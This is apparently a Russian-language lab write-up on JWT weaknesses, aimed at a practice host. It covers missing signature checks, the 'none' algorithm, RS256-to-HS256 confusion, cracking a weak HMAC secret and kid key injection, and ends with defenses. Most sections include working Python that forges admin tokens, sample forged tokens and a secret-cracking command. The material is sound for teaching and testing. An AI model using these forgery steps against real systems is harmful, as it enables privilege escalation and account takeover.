# JSON Web Token (JWT) insecure  

# Описание

JSON Web Token (JWT) -- открытый стандарт (RFC 7519), который определяет компактный способ передачи данных как JSON-объектов. 
Эти данные могут быть верифицированы и поддтверждены, так как они подписываются secret ключом. 
JWT часто используются в качестве механизма авторизации.

JWT токен состоит из 3 частей, которые раздены точками: 
1. Header: определяет какой алгоритм будет использован для генерации Signature, 
2. Payload: некоторая полезная нагрузка, 
3. Signature: подпись, которая вычисляется на основании Header и Payload и зависит от выбранного алгоритма. 

# Найденные уязвимости в рамках исследования

1. Отсутствие проверки подписи,
2. Возможно изменение алгоритма подписи,
3. "Слабый" secret key signature,
4. Возможно использовать none алгоритм для signature.

# Возможные векторы атаки

- Отсутствие проверки подписи,
- Возможно использовать none алгоритм для signature,
- Возможно изменение алгоритма подписи RS256 на HS256,
- "Слабый" secret key signature,
- Добавление ключа на сервер.
  
# Условия

- ОС: любая 
- язык: любой
- компоненты: необновленные библиотеки JWT, использование слабых/по-умолчанию secret key, использование одинаковых сертификатов 
- настройки: любые

# Детектирование

1. Убедиться, что используется JWT: инспекция исходного кода приложения, cookie, скрытых полей страниц, значений передаваемых параметров в запросах,
2. Если известна версия используемой библиотеки для работы с JWT, то проверить ее на наличие известных уязвимостей, например, 
изменение алгоритма подписи RS256 на HS256,
3. Проверить доступность использования <b>none</b> алгоритма для подписи,
4. Если в качестве алгоритма подписи используется алгоритм на основе secret key, например, HS256, то стоит попробовать подобрать
secret key. Можно попытаться использовать secret key по-умолчанию, или выбрать некоторый wordlist.

# Отсутствие проверки подписи

Данная уязвимость заключается в том, что на стороне сервера не проверяется Signature.

## Эксплуатация

### Шаг 1

Получаем JWT токен, для этого логинемся на http://jwt_insecure.lab/login

В session cookie сервер передает JWT токен.

```
session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc;
```

Для наглядности идем [сюда](https://jwt.io/) и декодируем JWT токен.

<b>Header</b>
```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```
<b>Payload</b>
```json
{
  "username": "user",
  "is_admin": false
}
```

### Шаг 2
 
Генерируем новый JWT токен, у которого Signature абсолютно любая. 
Для этого можно использовать следующий код.

```python
import base64

def b64urlencode(data):
    return base64.b64encode(data.encode('ascii')).decode('ascii').replace('+', '-').replace('/', '_').replace('=', '')

print('%s.%s.%s' % (
        b64urlencode('{"typ":"JWT","alg":"RS256"}'), # Header
        b64urlencode('{"username":"user","is_admin":true}'), # Payload
        b64urlencode('secret_signature'), ) # Some signature, not important
)
```

Полученный JWT токен
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6dHJ1ZX0.c2VjcmV0X3NpZ25hdHVyZQ
```

### Шаг 4

Заходим на http://jwt_insecure.lab/index_1 и меняем в заголовке запроса значение session cookie на сгенерированный токен.

Исходный запрос

![](img/utp_6.png)

Запрос после изменения токена

![](img/utp_7.png)

Ответ от сервера

![](img/utp_8.png)

# Возможно использовать none алгоритм для signature

Данная уязвимость основана на том, что сервер позволяет использовать none алгоритм для "подписи" JWT токена. None алгоритм
на самом деле ничего не подписывает, в данном случае Signature часть JWT токена становится пустой.

## Эксплуатация

### Шаг 1
 
Генерируем JWT токен, у которого Signature пустая. Для этого можно использовать следующий код.

```python
import base64

def b64urlencode(data):
    return base64.b64encode(data.encode('ascii')).decode('ascii').replace('+', '-').replace('/', '_').replace('=', '')

print('%s.%s' % (
        b64urlencode('{"typ":"JWT","alg":"none"}'), # Header with none
        b64urlencode('{"username":"user","is_admin":false}'), ) # Payload
)
```

Полученный JWT токен
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.
```

### Шаг 2

Заходим на http://jwt_insecure.lab/index_3 и меняем в заголовке запроса значение session cookie на сгенерированный токен.

Исходный запрос

![](img/utp_1.png)

Запрос после изменения токена

![](img/utp_2.png)

Ответ от сервера

![](img/utp_3.png)

# Возможно изменение алгоритма подписи

Данная уязвимость связана с особенностями реализации подписи JWT токена на основе RSA.
На стороне сервера для подписи JWT токена используется private key, а клиент для проверки правильности подписи должен
использовать public key. При получении токена от клиента сервер будет использовать public key для
проверки подписи, как будто он является клиентом.

В случае когда сервер ожидает токен с установленным алгоритмом RSA, а получает с алгоритмом HMAC, то сервер будет использовать
public key как симетричный ключ для верефикации подписи. Зная public key можно сменить алгоритм подписи с RSA на HMAC и
использовать public key для подписи JWT токена с помощью HMAC алгоритма.

## Эксплуатация 

### Шаг 1 

Идем на http://jwt_insecure.lab/index_2, на которой расположен base64 от public ключа

![](img/rshs_1.png)

```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FERk44dDdhS1UxbmQ2K1RQYkZFWVJmenIzWApnSE1QZGdzdVZ1c3MrL1UwMjNtRW1vajJ4Zy9lamR0V0UwTWJRUUxkT28rOXlqZmRNbWowYy9NbGYrYXF0M1lPCkNkUWtVV0l1RFZUOVVPTnRBUkFtYWNxQzNQT0xBNXgrcEIyc0ZieWNhT2ZQS2xYV3I2RXZVd2V0TW1PaWNuR1YKeGwrMEIwZDhid1d3TldPV0p3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=
```

### Шаг 2

Генерируем новый session_rsa cookie подписанный public ключом. Для этого можно использовать следующий код.

```python
# important: pyjwt version <= 0.4.2
import jwt
import base64

public_key = base64.b64decode(
        'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FERk44dDdhS1UxbmQ2K1RQYk'
        'ZFWVJmenIzWApnSE1QZGdzdVZ1c3MrL1UwMjNtRW1vajJ4Zy9lamR0V0UwTWJRUUxkT28rOXlqZmRNbWowYy9NbGYrYXF0M1lPCkNkUWtVV0l1'
        'RFZUOVVPTnRBUkFtYWNxQzNQT0xBNXgrcEIyc0ZieWNhT2ZQS2xYV3I2RXZVd2V0TW1PaWNuR1YKeGwrMEIwZDhid1d3TldPV0p3SURBUUFCCi'
        '0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=')

print(jwt.encode(
            {'username': 'user', 'is_admin': True}, 
            key=public_key, 
            algorithm='HS256'
            ).decode()
)
```

Переходим на http://jwt_insecure.lab/index_2

![](img/rshs_2.png)

Заменяем session_rsa cookie на полученный токен.

![](img/rshs_3.png)

Результат.

![](img/rshs_4.png)

# "Слабый" secret key signature

Если используемый HMAC алгоритм подписи использует слабый или по-умолчанию ключ, то его можно получить с помощью простого перебора.
Это можно сделать с помощью различных утилит (по ссылкам найдете примеры команд):
- [Hashcat](https://twitter.com/hashcat/status/955154646494040065)
- [jwt tool](https://github.com/ticarpi/jwt_tool)

## Эксплуатация

### Шаг 1

Берем JWT подписаный с помощью алгоритма HS256
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc
```

Составляем или скачиваем wordlist для перебора.

Используя jwt_tool, подбираем secret key.

```bash
python2 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc wordlist.txt
```

![](img/brute_1.png)

В данном случае в качестве ключа использовалась строка secret.

### Шаг 2

Генерируем новый JWT токен, подписаный данным ключом:
```python
import jwt

print(jwt.encode(
            {'username': '3v1lH4xx0r', 'is_admin': True}, 
            key='secret', 
            algorithm='HS256'
            ).decode()
)
```

Полученный JWT токен

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjN2MWxINHh4MHIiLCJpc19hZG1pbiI6dHJ1ZX0.ZOI8SQBvAQngYGVI2YYk-F1TWJc-amSmHs-c1Ai2ed4
```

### Шаг 3

Используем сгенерированный JWT токен

![](img/brute_2.PNG)


# Добавление ключа на сервер

Существуют стандартные поля, используемые в JWT Header. Один из них - kid - уникальный идентификатор используемого ключа (Key ID). 
Он указывается когда на сервере используются несколько различных ключей.
Если имеется возможность добавлять свои ключи на сервер, то атакующий может сгенерировать свой ключ / пару ключей, 
загрузить на сервер, и отправить самоподписаный JWT токен, указав в параметре kid идентификатор загруженного ключа. 
Таким образом можно отправлять произвольные JWT, которые будут успешно верефицированны на сервере.

## Эксплуатация

### Шаг 1

Генерируем свой ключ / пару ключей и загружаем его на сервер (если используется алгоритм на основе RSA, то загружать нужно public key).

### Шаг 2

Генерируем самоподписаный JWT токен, у которого в заголовке должно быть поле kid, где необходимо указать путь до загруженного ключа.

### Шаг 3 

Отправляем сгенерированный JWT токен.

# Ущерб 

Подмена JWT может потенциально может привести к повышению привелегий, авторизации под другими пользователями.

# Защита

1. Проверять актуальность библиотек на своих ресурсах,
2. Использовать сильные secret key,
3. Всегда проверять подпись токенов,
4. Запретить использовать none алгоритм подписи,
4. В случае использования микросервисов (если необходимо проводить проверку на нескольких серверах) необходимо использовать алгоритм RSA,
5. Захардкодить алгоритм подписи.

# Дополнительно

1. https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6
2. https://nandynarwhals.org/hitbgsec2017-pasty/
